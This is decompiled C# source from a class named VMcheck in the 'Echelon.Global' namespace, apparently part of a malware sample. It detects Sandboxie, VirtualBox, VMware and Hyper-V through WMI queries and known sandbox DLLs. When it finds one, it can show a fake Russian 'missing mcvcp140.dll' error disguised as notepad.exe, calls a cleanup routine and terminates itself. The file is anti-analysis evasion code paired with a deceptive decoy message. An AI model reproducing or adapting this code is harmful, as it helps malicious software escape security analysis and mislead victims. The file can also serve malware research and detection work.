using System;
using System.Management;
using System.Windows.Forms;

namespace Echelon.Global
{
	// Token: 0x02000045 RID: 69
	internal class VMcheck
	{
		// Token: 0x06000197 RID: 407 RVA: 0x0000C704 File Offset: 0x0000A904
		public static void CheckAnti()
		{
			if (VMcheck.inSandboxie() || VMcheck.inVirtualBox())
			{
				if (Program.VM_fakemessage)
				{
					MessageBox.Show("Запуск программы невозможен, так как на компьютере отсутствует mcvcp140.dll. Попробуйте переустановить программу.", "notepad.exe", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				Clean.GetClean();
				Environment.FailFast("bye bye");
			}
		}

		// Token: 0x06000198 RID: 408 RVA: 0x0000C758 File Offset: 0x0000A958
		public static bool inVirtualBox()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
				catch
				{
					return true;
				}
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000199 RID: 409 RVA: 0x0000C934 File Offset: 0x0000AB34
		public static bool inSandboxie()
		{
			string[] array = new string[]
			{
				"SbieDll.dll",
				"SxIn.dll",
				"Sf2.dll",
				"snxhk.dll",
				"cmdvrt32.dll"
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (NativeMethods.GetModuleHandle(array[i]).ToInt32() != 0)
				{
					return true;
				}
			}
			return false;
		}
	}
}
